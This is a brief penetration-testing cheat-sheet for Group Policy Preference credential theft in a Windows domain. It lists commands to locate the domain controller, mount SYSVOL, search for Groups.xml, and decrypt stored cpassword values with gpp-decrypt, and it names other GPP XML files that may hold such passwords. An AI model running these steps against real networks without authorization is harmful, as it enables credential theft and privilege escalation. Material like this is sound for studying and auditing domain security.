# Group Policy Preference

## Overview

* ff the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there.
* first we need to map/mount that drive
* in order to do that we need to know the IP-address of the domain controller
* we can just look in the environment-variables

## Output Environment Variables

```bash
set
```

## Look for the Following

```bash
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL
```

## Look Up IP Address

```bash
nslookup nameofserver.whatever.local
```

## It Will Output Something Like This

```bash
Address:  192.168.1.101
```

## Now Mount it

```bash
net use z: \\192.168.1.101\SYSVOL
```

## Then Enter it

```bash
z:
```

## Now Search for the groups.xml File

```bash
dir Groups.xml /s
```

* if we find the file with a password in it, we can decrypt it like this in Kali

```bash
gpp-decrypt encryptedpassword
```

```bash
#thest all may also have cpassword set
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element,
ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
```

